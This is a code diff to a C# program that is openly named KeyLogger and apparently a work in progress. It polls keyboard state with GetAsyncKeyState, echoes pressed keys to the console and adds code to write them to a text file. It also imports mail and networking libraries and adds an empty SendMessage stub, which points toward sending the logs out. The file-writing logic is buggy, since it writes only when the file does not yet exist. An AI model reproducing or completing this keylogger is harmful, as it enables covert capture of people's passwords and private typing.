@@ -1,6 +1,10 @@
 ﻿using System;
 using System.Runtime.InteropServices;
 using System.Threading;
+using System.IO;
+using System.Net;
+using System.Net.Mail;
+using System.Net.WebSockets;
 
 namespace KeyLogger
 {
@@ -11,6 +15,15 @@ namespace KeyLogger
 
         static void Main(string[] args)
         {
+
+            // string filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+            string fileName = ("../keyLoggerOnText.txt");
+
+            // if (!Directory.Exists(filepath))
+            // {
+            //     Directory.CreateDirectory(filepath);
+            // }
+
             while (true)
             {
                 Thread.Sleep(20);
@@ -18,15 +31,27 @@ namespace KeyLogger
                 for (int i = 32; i < 127; i++)
                 {
                     int keystate = GetAsyncKeyState(i);
-                    if (keystate != 0)
+
+                    if (keystate == 32768 || keystate != 0)
                     {
-                        if (keystate == 32768)
+                        Console.Write((char)i + ", ");
+
+                        if (!File.Exists(fileName))
                         {
-                            Console.Write((char)i + ", ");
+                            using (StreamWriter sw = File.AppendText(fileName))
+                            {
+                                sw.Write((char)i);
+                            }
                         }
                     }
                 }
             }
+        }
+
+        static void SendMessage()
+        {
+
+            // string folderName = Environment.GetFolderPath(Environment);
         }
 
     }
